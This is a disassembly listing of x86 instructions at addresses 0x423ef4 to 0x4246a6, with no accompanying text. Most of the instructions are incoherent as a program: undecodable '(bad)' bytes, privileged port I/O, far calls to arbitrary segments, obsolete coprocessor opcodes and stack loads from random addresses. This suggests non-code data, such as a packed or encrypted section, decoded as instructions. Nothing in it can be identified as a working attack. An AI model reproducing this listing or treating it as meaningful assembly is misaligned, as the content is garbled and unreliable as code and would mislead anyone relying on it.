  423ef4:	imul   esi,DWORD PTR [edi-0x2c345908],0xda95f1a7
  423efe:	sbb    dh,BYTE PTR ss:[edi+0x548f5924]
  423f05:	xor    ebx,eax
  423f07:	sub    al,0x2c
  423f09:	push   eax
  423f0a:	mov    dh,0xad
  423f0c:	fcomp  QWORD PTR [eax+0x14]
  423f0f:	dec    eax
  423f10:	imul   eax,DWORD PTR [ebx],0x47aa9b57
  423f16:	inc    ebx
  423f17:	imul   ebp,DWORD PTR [ecx+0x69],0x329e92db
  423f1e:	push   es
  423f1f:	sbb    cl,BYTE PTR ds:0x4b86d0c8
  423f25:	dec    ebx
  423f26:	add    eax,0xe3140068
  423f2b:	add    DWORD PTR [ecx+eax*1+0x37],0xa76ea81a
  423f33:	jnp    0x423f17
  423f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f36:	pusha  
  423f37:	lea    edi,[ebx+0x2f96026f]
  423f3d:	ins    BYTE PTR es:[edi],dx
  423f3e:	or     BYTE PTR [edx],cl
  423f40:	and    eax,0x2edb00e5
  423f45:	mov    dh,0x6c
  423f47:	cmp    BYTE PTR [esi],dl
  423f49:	call   0x9fc6:0x7c7f9abe
  423f50:	pop    edi
  423f51:	stos   DWORD PTR es:[edi],eax
  423f52:	test   al,0xab
  423f54:	fild   QWORD PTR cs:[ebp-0x3d]
  423f58:	loop   0x423fce
  423f5a:	push   esi
  423f5b:	ins    BYTE PTR es:[edi],dx
  423f5c:	test   ebx,ebx
  423f5e:	inc    esi
  423f5f:	daa    
  423f60:	push   ss
  423f61:	out    0xde,al
  423f63:	fs icebp 
  423f65:	mov    esp,0x2eda2a50
  423f6a:	sub    al,0x40
  423f6c:	dec    edi
  423f6d:	xor    al,0xfe
  423f6f:	jne    0x423f3f
  423f71:	mov    DWORD PTR [ecx+0x69],esp
  423f74:	popa   
  423f75:	jmp    0x423f2a
  423f77:	push   edx
  423f78:	in     al,dx
  423f79:	or     eax,0x2de0382b
  423f7e:	call   0x6e1c7694
  423f83:	ror    BYTE PTR [ebx],0xa0
  423f86:	push   cs
  423f87:	dec    edx
  423f88:	and    esi,ecx
  423f8a:	pop    es
  423f8b:	push   eax
  423f8c:	imul   edi,DWORD PTR [ebx+0x26644435],0x835cdef9
  423f96:	jno    0x423f25
  423f98:	ins    DWORD PTR es:[edi],dx
  423f99:	jmp    0x423f3b
  423f9b:	sti    
  423f9c:	loop   0x423fdc
  423f9e:	fwait
  423f9f:	cmp    al,0x6e
  423fa1:	mov    bh,0x6
  423fa3:	adc    eax,0x99adb6dc
  423fa8:	scas   eax,DWORD PTR es:[edi]
  423fa9:	pop    ebx
  423faa:	inc    esp
  423fab:	pop    ebx
  423fac:	xchg   BYTE PTR [edx-0x27412796],ah
  423fb2:	fadd   DWORD PTR [ebx+0x2bc02b0a]
  423fb8:	mov    edx,0x83c11a67
  423fbd:	ins    DWORD PTR es:[edi],dx
  423fbe:	fcmovnu st,st(2)
  423fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fc1:	mov    DWORD PTR [ebx],edx
  423fc3:	jns    0x423f90
  423fc5:	push   ss
  423fc6:	cmp    al,0x83
  423fc9:	in     eax,dx
  423fca:	push   edx
  423fcb:	mov    ebx,0xfb627c
  423fd0:	sbb    eax,0x17449776
  423fd5:	pop    esp
  423fd6:	push   ds
  423fd7:	sahf   
  423fd8:	mov    dh,0xb4
  423fda:	mov    cl,0xb5
  423fdc:	in     eax,dx
  423fdd:	jge    0x424014
  423fdf:	xor    al,BYTE PTR [esi]
  423fe1:	es jp  0x42400f
  423fe4:	clc    
  423fe5:	adc    al,ch
  423fe7:	rol    dl,cl
  423fe9:	mov    ss,WORD PTR [esp+ecx*2-0x75b8059]
  423ff0:	pusha  
  423ff1:	adc    eax,eax
  423ff3:	sub    edx,esp
  423ff5:	fxam   
  423ff7:	or     eax,DWORD PTR [esi-0x49]
  423ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ffb:	lods   eax,DWORD PTR ds:[esi]
  423ffc:	fnstsw WORD PTR [ebx-0x50]
  423fff:	mov    ebx,0x71625668
  424004:	inc    esp
  424005:	xchg   edx,eax
  424006:	xor    cl,BYTE PTR [ebx+0x11d6ed8]
  42400c:	pop    ecx
  42400d:	cdq    
  42400e:	cwde   
  42400f:	cdq    
  424010:	rcl    BYTE PTR [ecx],0xc
  424013:	shr    DWORD PTR [ebp-0x5a08d793],0xcc
  42401a:	bound  ecx,QWORD PTR [ebp-0x5e]
  42401d:	or     BYTE PTR [edi],dl
  42401f:	pop    esp
  424020:	sub    al,0x74
  424022:	jbe    0x423fd7
  424024:	mov    ds:0xc73196a6,eax
  424029:	mov    BYTE PTR [esi+0x61],al
  42402c:	adc    eax,DWORD PTR [eax]
  42402e:	lods   al,BYTE PTR ds:[esi]
  42402f:	stos   BYTE PTR es:[edi],al
  424030:	bound  ebx,QWORD PTR [esi+0x36]
  424033:	mov    ebx,0xbcdb6ed4
  424038:	add    ch,al
  42403a:	pop    edi
  42403b:	out    0x36,eax
  42403d:	xlat   BYTE PTR ds:[ebx]
  42403e:	pop    ss
  42403f:	jle    0x424010
  424041:	mov    ecx,0x5ba8baad
  424046:	clc    
  424047:	es into 
  424049:	leave  
  42404a:	cmp    ebp,eax
  42404c:	or     ecx,DWORD PTR [ebp-0x60c73526]
  424052:	pop    ecx
  424053:	pop    esp
  424054:	adc    ah,ch
  424056:	and    dl,cl
  424058:	ss mov dh,0xb
  42405b:	loop   0x424041
  42405d:	nop
  42405e:	ds adc eax,0x8d8c33bd
  424064:	mov    al,ds:0xf715b82b
  424069:	mov    dh,0x8c
  42406b:	inc    ebx
  42406c:	call   0x7dc1:0xa064101d
  424073:	push   cs
  424074:	out    0x6d,al
  424076:	inc    eax
  424077:	or     eax,0x3d796441
  42407c:	inc    esi
  42407d:	inc    edx
  42407e:	stos   DWORD PTR es:[edi],eax
  42407f:	sub    ch,BYTE PTR [ecx+esi*1-0x26]
  424083:	test   eax,0x6e877fbc
  424088:	in     eax,dx
  424089:	(bad)  
  42408a:	push   edx
  42408b:	or     eax,0x1a02f5a7
  424090:	or     ch,BYTE PTR [edx+0x2f]
  424093:	inc    esi
  424094:	pop    ss
  424095:	les    eax,FWORD PTR [ebp+0x1d879711]
  42409b:	daa    
  42409c:	lahf   
  42409d:	in     eax,dx
  42409e:	aad    0x16
  4240a0:	mov    dh,0xdb
  4240a2:	je     0x424069
  4240a4:	jle    0x424112
  4240a6:	cwde   
  4240a7:	pop    ds
  4240a8:	pop    ebx
  4240a9:	stc    
  4240aa:	or     DWORD PTR [esi+0x5416df88],0xffffffad
  4240b1:	sbb    eax,0xdd1f030f
  4240b6:	fcomp  st(2)
  4240b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240b9:	test   eax,0xa717e14a
  4240be:	mov    dh,0x9a
  4240c0:	leave  
  4240c1:	in     eax,0xd3
  4240c3:	push   ebx
  4240c4:	les    esi,FWORD PTR [esi+0x64e4a7b0]
  4240ca:	test   al,0x2
  4240cc:	clc    
  4240cd:	xchg   esi,eax
  4240ce:	popa   
  4240cf:	mov    ds:0xdcf96083,eax
  4240d4:	mov    ebx,0x649203ec
  4240d9:	call   0x36b78830
  4240de:	rcl    DWORD PTR [esi],1
  4240e0:	mov    dl,0x11
  4240e2:	stos   WORD PTR es:[edi],ax
  4240e4:	pop    ebx
  4240e5:	pop    ss
  4240e6:	les    ecx,FWORD PTR [esi]
  4240e8:	inc    ebx
  4240e9:	mov    ecx,0x981421e3
  4240ee:	mov    eax,0x6d6e02ec
  4240f3:	mov    dh,0x29
  4240f5:	pop    es
  4240f6:	add    dh,BYTE PTR [edx-0x16]
  4240f9:	mov    edx,0x4035b43f
  4240fe:	sub    al,0xc7
  424100:	je     0x42416e
  424102:	pop    ebp
  424103:	into   
  424104:	fldcw  WORD PTR [ebp+0x6c]
  424107:	in     eax,dx
  424108:	mov    dh,0xec
  42410a:	add    DWORD PTR [ebx-0x7d],ebp
  42410d:	sub    dl,bh
  42410f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424110:	add    ch,BYTE PTR [ebx-0x27df947e]
  424116:	cs jecxz 0x424185
  424119:	out    dx,al
  42411a:	retf   
  42411b:	dec    ecx
  42411c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42411d:	in     al,0x2
  42411f:	or     bl,dl
  424121:	ret    0xc06d
  424124:	inc    esp
  424125:	mov    esp,0xc53e61ba
  42412a:	fcmovnbe st,st(2)
  42412c:	ret    0x7dd6
  42412f:	outs   dx,BYTE PTR ds:[esi]
  424130:	cmp    DWORD PTR [eax],edx
  424132:	mov    bh,0x59
  424134:	ja     0x4241a7
  424136:	mov    dh,0xbb
  424138:	mov    cl,0x6d
  42413a:	dec    ebx
  42413b:	jp     0x42414f
  42413d:	into   
  42413e:	jg     0x424120
  424140:	xchg   esi,eax
  424141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424142:	div    BYTE PTR [edx]
  424144:	sahf   
  424145:	lods   eax,DWORD PTR ds:[esi]
  424146:	sub    eax,ebp
  424148:	inc    esi
  424149:	mov    ah,0xbe
  42414b:	or     BYTE PTR [esi+eax*4],ch
  42414e:	out    0x37,al
  424150:	mov    dh,0x6d
  424152:	add    DWORD PTR [edi+0x44024d18],0xf18a7014
  42415c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42415d:	mov    dh,0xe
  42415f:	fiadd  DWORD PTR [edi+edi*8-0xf]
  424163:	xor    al,0x91
  424165:	mov    bh,0x71
  424167:	cwde   
  424168:	sub    al,0x74
  42416a:	push   ebp
  42416b:	fadd   QWORD PTR [eax-0x17c004d6]
  424171:	loop   0x424153
  424173:	fstp   QWORD PTR [eax+0x6a]
  424176:	inc    eax
  424177:	jge    0x42416e
  424179:	fidivr DWORD PTR [edi]
  42417b:	(bad)  
  42417c:	adc    al,0x26
  42417e:	or     al,0xc1
  424180:	mov    dh,0xe3
  424182:	jp     0x42413d
  424184:	xlat   BYTE PTR ds:[ebx]
  424185:	gs popa 
  424187:	fstp   st(0)
  424189:	push   0x53db8edb
  42418e:	sub    al,0xe6
  424190:	sub    eax,ecx
  424192:	add    esp,DWORD PTR [eax+0x74b6c042]
  424198:	mov    eax,ds:0x862ca050
  42419d:	lds    esi,FWORD PTR [eax-0x71]
  4241a0:	push   edx
  4241a1:	mov    ah,0xa3
  4241a3:	fiadd  DWORD PTR [ecx]
  4241a5:	das    
  4241a6:	icebp  
  4241a7:	cwde   
  4241a8:	dec    ecx
  4241a9:	mov    ds:0xd40adb8a,al
  4241ae:	push   esp
  4241af:	in     al,0x3e
  4241b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241b2:	ds stos DWORD PTR es:[edi],eax
  4241b4:	add    bl,al
  4241b6:	mov    dh,0x6d
  4241b8:	popa   
  4241b9:	xor    DWORD PTR [edx+ebx*4],0xa91d48a4
  4241c0:	sub    ebp,esi
  4241c2:	jbe    0x42422f
  4241c4:	imul   ebx,DWORD PTR [ecx+edx*4-0x4d],0xffffffc4
  4241c9:	ss adc BYTE PTR gs:[esi+edi*2],al
  4241ce:	in     eax,dx
  4241cf:	clc    
  4241d0:	pop    ebx
  4241d1:	clc    
  4241d2:	les    ecx,FWORD PTR [ebp+0x3d8a84f9]
  4241d8:	inc    eax
  4241d9:	frstor [esi+0x1b6b05e4]
  4241df:	mov    al,ds:0x390d445b
  4241e4:	out    dx,eax
  4241e5:	or     edx,0xaaa505ef
  4241eb:	lea    ebp,[ebp+0x74]
  4241ee:	xlat   BYTE PTR ds:[ebx]
  4241ef:	inc    edx
  4241f0:	mov    ah,0x3d
  4241f2:	adc    DWORD PTR [esi+edi*4-0x4c],edx
  4241f6:	inc    ebp
  4241f7:	jp     0x4241d8
  4241f9:	lods   eax,DWORD PTR ds:[esi]
  4241fa:	push   ebp
  4241fb:	add    BYTE PTR [ebx-0x292d124f],ah
  424201:	mov    dh,0xb
  424203:	jae    0x424234
  424205:	icebp  
  424206:	std    
  424207:	xchg   ebp,eax
  424208:	xchg   ebp,eax
  424209:	pop    esi
  42420a:	cmc    
  42420b:	or     eax,esp
  42420d:	ret    0xb06
  424210:	xchg   edi,eax
  424211:	or     BYTE PTR [ebx],bh
  424213:	sbb    ebp,DWORD PTR [eax]
  424215:	xor    DWORD PTR [esp+eax*2],ebp
  424218:	sub    DWORD PTR [edx+0x61],ebx
  42421b:	fbstp  TBYTE PTR [esp+esi*8+0x3db0a055]
  424222:	(bad)  
  424223:	(bad)  
  424224:	pop    ss
  424225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424226:	mov    esp,DWORD PTR [esi+0x1742edf2]
  42422c:	lahf   
  42422d:	pop    eax
  42422e:	jg     0x424217
  424230:	and    BYTE PTR [ebx+0x4a80084],dh
  424236:	jne    0x42429b
  424238:	popa   
  424239:	or     DWORD PTR [esi+eax*8+0x372d3f34],0x79
  424241:	adc    eax,0x7f046a8
  424246:	jecxz  0x42425b
  424248:	repz mov ds:0x712c6d05,al
  42424e:	sbb    BYTE PTR [ecx+0x5ba8416a],dh
  424254:	mov    ebx,0xdcd103b5
  424259:	inc    esi
  42425a:	aam    0x20
  42425c:	sub    DWORD PTR ds:0xed00d006,ebp
  424262:	pushf  
  424263:	xchg   ebx,eax
  424264:	retf   
  424265:	(bad)  
  424266:	xor    eax,0xb7688d83
  42426b:	lods   eax,DWORD PTR ds:[esi]
  42426c:	test   eax,0xda7e920c
  424271:	pop    ss
  424272:	xor    eax,0xa82eb715
  424277:	test   DWORD PTR [esp+esi*1+0x2c],0xa3b61a34
  42427f:	outs   dx,BYTE PTR ds:[esi]
  424280:	sbb    eax,0x2475686
  424285:	(bad)  
  424286:	cmp    al,0x5d
  424288:	gs sahf 
  42428a:	lods   eax,DWORD PTR ds:[esi]
  42428b:	dec    ebx
  42428c:	scas   al,BYTE PTR es:[edi]
  42428d:	mov    dh,0xe
  42428f:	add    al,0xc2
  424291:	inc    edi
  424292:	dec    edi
  424293:	hlt    
  424294:	sbb    bl,0xd6
  424297:	(bad)  
  424298:	xchg   esi,eax
  424299:	std    
  42429a:	mov    WORD PTR [ebx],?
  42429c:	bound  ebx,QWORD PTR [esi+0x46]
  42429f:	sahf   
  4242a0:	lds    edi,FWORD PTR [ebx-0x7f]
  4242a3:	mov    dh,0xd0
  4242a5:	outs   dx,BYTE PTR ds:[esi]
  4242a6:	xchg   edx,eax
  4242a7:	fdivr  st,st(7)
  4242a9:	add    ch,dh
  4242ab:	imul   eax,DWORD PTR [eax-0x3495a27b],0x42
  4242b2:	sbb    al,0x10
  4242b4:	pop    ss
  4242b5:	mov    WORD PTR [esi+ecx*1+0xd4b1b4c],cs
  4242bc:	stos   BYTE PTR es:[edi],al
  4242bd:	dec    ebp
  4242be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242bf:	sub    DWORD PTR [ebp+eiz*4-0x45ae4939],ecx
  4242c6:	xchg   ebp,eax
  4242c7:	add    DWORD PTR [ebp-0x10],edi
  4242ca:	inc    ecx
  4242cb:	jp     0x424284
  4242cd:	rcl    BYTE PTR [ecx],0x1d
  4242d0:	mov    ch,0xa1
  4242d2:	call   0x5cc25c1b
  4242d7:	add    eax,0x68b67106
  4242dc:	or     BYTE PTR [esi+0x38],ch
  4242df:	sahf   
  4242e0:	or     ebp,edi
  4242e2:	xchg   edx,eax
  4242e3:	test   al,0xee
  4242e5:	or     eax,0xa4dadb60
  4242ea:	mov    DWORD PTR [ecx],esi
  4242ec:	loope  0x42426e
  4242ee:	in     al,dx
  4242ef:	pop    esp
  4242f0:	lods   eax,DWORD PTR ds:[esi]
  4242f1:	and    BYTE PTR [esi-0x6415aa78],0x30
  4242f8:	mov    ebx,0xaa6fca39
  4242fd:	add    cl,BYTE PTR ds:0xcfa29900
  424303:	mov    esi,es
  424305:	or     BYTE PTR [ebx],0x74
  424308:	mov    ds:0xb1c66a03,eax
  42430d:	xchg   ebx,eax
  42430e:	adc    dl,dl
  424310:	addr16 push eax
  424312:	xchg   dl,bl
  424314:	add    al,0xb4
  424316:	sub    DWORD PTR [esi+0x2aec113d],esi
  42431c:	outs   dx,BYTE PTR ds:[esi]
  42431d:	cmp    esi,DWORD PTR [edx-0x4b5c9326]
  424323:	mov    dh,0x9e
  424325:	fidiv  DWORD PTR [esi-0x35]
  424328:	sbb    dl,BYTE PTR [edi+esi*2+0x3e]
  42432c:	aas    
  42432d:	sub    ecx,DWORD PTR [esi+edx*4-0x3a]
  424331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424332:	ins    DWORD PTR es:[edi],dx
  424333:	fcmovne st,st(0)
  424335:	mov    DWORD PTR [ecx+0x11],esi
  424338:	in     al,dx
  424339:	add    edx,0xffffffc8
  42433c:	out    0x60,eax
  42433e:	fcmovnb st,st(2)
  424340:	push   esi
  424341:	mov    al,ds:0x6ac6e665
  424346:	inc    eax
  424347:	mov    edi,0x2e281a2c
  42434c:	ins    BYTE PTR es:[edi],dx
  42434d:	enter  0x8271,0x9c
  424351:	mov    ebp,esp
  424353:	and    al,0xb6
  424355:	inc    esi
  424356:	push   eax
  424357:	and    bl,BYTE PTR ds:0x55cb2355
  42435d:	jo     0x42438a
  42435f:	fadd   QWORD PTR [edi-0x69]
  424362:	fld    DWORD PTR [edx+eiz*2]
  424365:	cdq    
  424366:	fnstenv [eax-0x15]
  424369:	and    dl,bl
  42436b:	aaa    
  42436c:	mov    WORD PTR [ebx+0x1d],es
  42436f:	xchg   esp,eax
  424370:	xchg   al,bh
  424372:	idiv   DWORD PTR [ebx-0x15ea293b]
  424378:	loopne 0x42439a
  42437a:	shl    DWORD PTR [ebx+0x54],cl
  42437d:	jle    0x4243a5
  42437f:	sub    ebp,edx
  424381:	test   al,0x5b
  424383:	retf   
  424384:	js     0x4243f3
  424386:	movsx  ecx,dx
  424389:	sbb    BYTE PTR es:[ebx],0x5b
  42438d:	clc    
  42438e:	lds    ebp,FWORD PTR [edx+ebp*8-0xd]
  424392:	push   es
  424393:	fimul  DWORD PTR [edx+0x4b]
  424396:	fneni(8087 only) 
  424398:	mov    al,ds:0x37ef8f8f
  42439d:	je     0x4243e0
  42439f:	push   ss
  4243a0:	dec    ebx
  4243a1:	pop    ebx
  4243a2:	adc    ebx,DWORD PTR [ebp+0x1a]
  4243a5:	fiadd  WORD PTR [ecx-0x43]
  4243a8:	out    dx,al
  4243a9:	sahf   
  4243aa:	push   cs
  4243ab:	pop    esp
  4243ac:	test   DWORD PTR [ebx+0x6a],ebx
  4243af:	frstpm(287 only) 
  4243b1:	out    dx,eax
  4243b2:	add    BYTE PTR [ecx+edx*4],ch
  4243b5:	xchg   esi,eax
  4243b6:	das    
  4243b7:	test   BYTE PTR [esi+ecx*8-0x724931bf],cl
  4243be:	jbe    0x424423
  4243c0:	sbb    DWORD PTR [eax],0xf62afc7
  4243c6:	mov    ss,WORD PTR [edx+0x285b6888]
  4243cc:	(bad)  [eax+0xc]
  4243cf:	sbb    edx,DWORD PTR [esi+0x7]
  4243d2:	int3   
  4243d3:	imul   edx,DWORD PTR [ebp+ebp*4+0x482362ab],0x50
  4243db:	inc    ebp
  4243dc:	sbb    DWORD PTR [ecx-0x5e],eax
  4243df:	jno    0x42444c
  4243e1:	mov    bh,0xc2
  4243e3:	out    0x24,al
  4243e5:	adc    bh,bl
  4243e7:	pop    edi
  4243e8:	dec    ebp
  4243e9:	lock leave 
  4243eb:	lea    esi,[esi+0x5b]
  4243ee:	fcom   DWORD PTR [ebx+0x68ec3749]
  4243f4:	out    dx,eax
  4243f5:	sahf   
  4243f6:	mov    bl,0xb4
  4243f8:	mov    dh,0xc2
  4243fa:	ins    DWORD PTR es:[edi],dx
  4243fb:	sub    DWORD PTR [ebp-0x28],0x71873e80
  424402:	test   esi,ecx
  424404:	fs xchg esi,eax
  424406:	pop    edx
  424407:	push   0xb1ca7b37
  42440c:	pop    edi
  42440d:	jns    0x4243e1
  42440f:	sub    dl,BYTE PTR [ebx]
  424411:	pop    edx
  424412:	rcl    DWORD PTR [esi-0x28c448de],1
  424418:	sbb    BYTE PTR [esi],dh
  42441a:	mov    dh,0xa2
  42441c:	push   ss
  42441d:	scas   eax,DWORD PTR es:[edi]
  42441e:	sub    eax,0x7509072a
  424423:	fimul  DWORD PTR [eax]
  424425:	call   0x14cf:0x4fcde0a0
  42442c:	pop    ebp
  42442d:	push   0x16138c0a
  424432:	or     BYTE PTR [ecx-0x7b],dl
  424435:	and    edi,DWORD PTR [edx-0xca3bb2f]
  42443b:	add    al,0x48
  42443d:	cmp    al,0xc2
  42443f:	inc    edx
  424440:	(bad)
  424443:	shr    ah,cl
  424445:	xor    al,0x96
  424447:	(bad)  
  424449:	inc    edi
  42444a:	sub    DWORD PTR [esi+0x3b32818d],esi
  424450:	push   esi
  424451:	push   edx
  424452:	or     eax,esp
  424454:	add    al,BYTE PTR ds:0x7c339802
  42445a:	and    ch,BYTE PTR [esi-0x1b]
  42445d:	pop    ebx
  42445e:	stos   DWORD PTR es:[edi],eax
  42445f:	mov    ds:0xf2008253,eax
  424464:	mov    eax,ds:0x96a7c37d
  424469:	sub    eax,0x681b809a
  42446e:	in     eax,dx
  42446f:	mov    esi,0xdb637072
  424474:	xchg   esi,eax
  424475:	das    
  424476:	test   BYTE PTR [ebp+0x34],ah
  424479:	add    eax,0xa0c51214
  42447e:	or     ah,BYTE PTR [eax-0x25]
  424481:	push   eax
  424482:	adc    BYTE PTR [eax+ebp*1+0x68b6239e],bl
  424489:	fucomp st(0)
  42448b:	and    ebp,DWORD PTR [esi+esi*1-0x5786d9fe]
  424492:	sbb    eax,0x170a16d8
  424497:	jbe    0x4244f0
  424499:	jnp    0x42448f
  42449b:	pop    eax
  42449c:	or     DWORD PTR [eax],esp
  42449e:	dec    edx
  42449f:	test   al,0xb6
  4244a1:	ds pop esp
  4244a3:	rcr    DWORD PTR [edx+0x45521f36],cl
  4244a9:	mov    ds:0x2f95bac9,eax
  4244ae:	in     al,dx
  4244af:	call   0xbb00:0x4a400a35
  4244b6:	inc    ebp
  4244b7:	enter  0x8db4,0x53
  4244bb:	add    eax,0x8270086d
  4244c0:	les    esp,FWORD PTR [ebx-0x45]
  4244c3:	add    BYTE PTR [esi+0x7b14c85b],dh
  4244c9:	adc    ebx,DWORD PTR [edx]
  4244cb:	ret    0x8449
  4244ce:	inc    edi
  4244cf:	lods   eax,DWORD PTR ds:[esi]
  4244d0:	push   ecx
  4244d1:	dec    ebp
  4244d2:	push   eax
  4244d3:	clc    
  4244d4:	lahf   
  4244d5:	imul   ecx,DWORD PTR [ebx],0x8dda3751
  4244db:	inc    edi
  4244dc:	cmp    al,0xad
  4244de:	mov    dl,BYTE PTR [eax+0x27]
  4244e1:	gs stos BYTE PTR es:[edi],al
  4244e3:	popa   
  4244e4:	jnp    0x42453e
  4244e6:	fisub  DWORD PTR [ecx]
  4244e8:	cs fwait
  4244ea:	push   cs
  4244eb:	pop    eax
  4244ec:	add    al,0xf6
  4244ee:	cmp    BYTE PTR [edx],bh
  4244f0:	pop    es
  4244f1:	mov    eax,0x417cbad5
  4244f6:	mov    cl,0x0
  4244f8:	pop    eax
  4244f9:	shl    DWORD PTR [edx+0x40],0xaf
  4244fd:	cmp    al,0x94
  4244ff:	sub    DWORD PTR [eax-0x57],0xec1dd5a1
  424506:	sub    al,0x6c
  424508:	popa   
  424509:	jmp    0x681e:0x66265bab
  424510:	cmc    
  424511:	arpl   WORD PTR [ebp-0x69aa5753],si
  424517:	and    eax,0xd11bd4a8
  42451c:	mov    dh,0x6d
  42451e:	cs mov bh,0x14
  424521:	shl    BYTE PTR [edi+0x166e6c8c],cl
  424527:	jbe    0x42456d
  424529:	ins    DWORD PTR es:[edi],dx
  42452a:	cwde   
  42452b:	push   ecx
  42452c:	cmp    BYTE PTR [edi-0x5dc571e8],dl
  424532:	cmp    DWORD PTR [edx-0x4d3c72c],0x4
  424539:	pop    ss
  42453a:	pop    edi
  42453b:	add    al,0x70
  42453d:	pop    ebx
  42453e:	fsubr  DWORD PTR ds:0x98316a33
  424544:	shl    bl,0xe5
  424547:	(bad)  
  424548:	push   esi
  424549:	fcomp  st(2)
  42454b:	adc    eax,eax
  42454d:	aaa    
  42454e:	ds cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  424551:	mov    ah,0x89
  424553:	call   0x14db42e
  424558:	or     al,0xe9
  42455a:	push   ebx
  42455b:	fnstsw WORD PTR [eax]
  42455d:	jge    0x4244fc
  42455f:	ss aaa 
  424561:	mov    dh,0xad
  424563:	mov    ds:0x773b7d34,eax
  424568:	add    bh,BYTE PTR [esp+edi*8+0x6372ecf1]
  42456f:	imul   ebp,DWORD PTR [ebp+0x65],0xffffffe0
  424573:	jl     0x4245e0
  424575:	test   BYTE PTR [ecx],0x5c
  424578:	or     ebp,DWORD PTR [edi+ebx*1+0x5b]
  42457c:	(bad)  ds:0x13da353
  424582:	fidivr WORD PTR [eax]
  424584:	sahf   
  424585:	es fcmovbe st,st(6)
  424588:	push   edx
  424589:	ins    BYTE PTR es:[edi],dx
  42458a:	iret   
  42458b:	scas   eax,DWORD PTR es:[edi]
  42458c:	pop    es
  42458d:	pusha  
  42458e:	fs sub cl,ch
  424591:	or     eax,0x76161616
  424596:	push   edx
  424597:	fdivr  st(0),st
  424599:	inc    ebx
  42459a:	aam    0x77
  42459c:	pop    ss
  42459d:	mov    dh,0xad
  42459f:	test   edi,edi
  4245a1:	push   ebp
  4245a2:	dec    ecx
  4245a3:	xchg   esp,eax
  4245a4:	jmp    0x6f09d853
  4245a9:	push   edx
  4245aa:	rol    BYTE PTR [ecx],1
  4245ac:	jne    0x424619
  4245ae:	jge    0x4245d6
  4245b0:	mov    cl,0xa1
  4245b2:	stc    
  4245b3:	pop    ecx
  4245b4:	push   ss
  4245b5:	fisub  DWORD PTR [ebp-0x3bc703ea]
  4245bb:	cmp    ebx,ecx
  4245bd:	adc    esp,DWORD PTR [edx-0x4a]
  4245c0:	ret    0xddb6
  4245c3:	xor    BYTE PTR [ecx-0x44],0xb0
  4245c7:	iret   
  4245c8:	sub    al,0xbe
  4245ca:	mov    fs,WORD PTR [ecx+0x504d17da]
  4245d0:	mov    bh,0xeb
  4245d2:	push   es
  4245d3:	xchg   esp,eax
  4245d4:	fwait
  4245d5:	(bad)  
  4245d6:	mul    BYTE PTR [ecx+0x6b]
  4245d9:	fistp  DWORD PTR [edx-0x27]
  4245dc:	xlat   BYTE PTR ds:[ebx]
  4245dd:	gs add BYTE PTR es:0x5bbe9fb2,0x5b
  4245e6:	push   ebx
  4245e7:	jo     0x42462b
  4245e9:	jg     0x4245db
  4245eb:	xor    esi,esp
  4245ed:	ins    DWORD PTR es:[edi],dx
  4245ee:	xchg   ecx,eax
  4245ef:	into   
  4245f0:	mov    dh,0x80
  4245f2:	es or  dh,0xb7
  4245f6:	pop    edx
  4245f7:	js     0x424666
  4245f9:	mov    ebx,0xb9d1b0b1
  4245fe:	adc    ah,BYTE PTR [ebp-0x46f39475]
  424604:	repnz xor eax,0x622e454a
  42460a:	mov    al,0x64
  42460c:	sbb    BYTE PTR [ecx-0x562fd723],dh
  424612:	pop    edx
  424613:	aad    0xad
  424615:	adc    bh,BYTE PTR [ebp+0x64]
  424618:	shr    BYTE PTR [esi+0x5],1
  42461b:	stos   BYTE PTR es:[edi],al
  42461c:	sub    eax,0x62cfc227
  424621:	inc    ecx
  424622:	mov    dh,0xed
  424624:	shl    BYTE PTR [esi-0x5e8e0aa8],cl
  42462a:	sbb    dl,BYTE PTR [ecx+0x6b92b0e8]
  424630:	xor    dl,cl
  424632:	scas   al,BYTE PTR es:[edi]
  424633:	mov    eax,0xbb223ed0
  424638:	push   edi
  424639:	fnsetpm(287 only) 
  42463b:	and    bl,bl
  42463d:	outs   dx,BYTE PTR ds:[esi]
  42463e:	sbb    ecx,DWORD PTR [ebp+0x56]
  424641:	xchg   BYTE PTR ds:0xadb1473,ch
  424647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424648:	push   DWORD PTR [edx]
  42464a:	sub    ebp,edx
  42464c:	inc    esi
  42464d:	arpl   WORD PTR [edx-0x7f],bx
  424650:	in     al,0xa6
  424652:	mov    cl,0xed
  424654:	sub    al,0xdb
  424656:	ins    DWORD PTR es:[edi],dx
  424657:	mov    eax,ds:0xf23a4cb8
  42465c:	pop    ecx
  42465d:	xchg   edx,eax
  42465e:	(bad)  
  42465f:	adc    DWORD PTR [esi+0x6d28db6d],esp
  424665:	sbb    edi,DWORD PTR [eax-0x77]
  424668:	pop    edx
  424669:	mov    ?,WORD PTR [edx-0x1f]
  42466c:	dec    edx
  42466d:	cs mov ah,0xad
  424670:	mov    BYTE PTR [esi],bl
  424672:	cmp    BYTE PTR [edi-0x70b5627d],bh
  424678:	push   edi
  424679:	les    esi,FWORD PTR [esi+0x2afabb83]
  42467f:	add    ah,BYTE PTR [esi-0x8]
  424682:	fcmovnu st,st(0)
  424684:	sbb    al,BYTE PTR [ecx+0x58]
  424687:	jg     0x424651
  424689:	cmp    ebx,eax
  42468b:	test   eax,0x25a82620
  424690:	bound  esi,QWORD PTR [edi]
  424692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424693:	xchg   edx,eax
  424694:	imul   esi,DWORD PTR [esi-0x792aa3d6],0x69
  42469b:	jp     0x424657
  42469d:	dec    ebx
  42469e:	sub    dh,BYTE PTR [esi]
  4246a0:	inc    ecx
  4246a1:	fst    QWORD PTR [edi]
  4246a3:	or     BYTE PTR [edi-0x38],cl
  4246a6:	or     BYTE PTR [ecx+0x3a37041d],0xbf
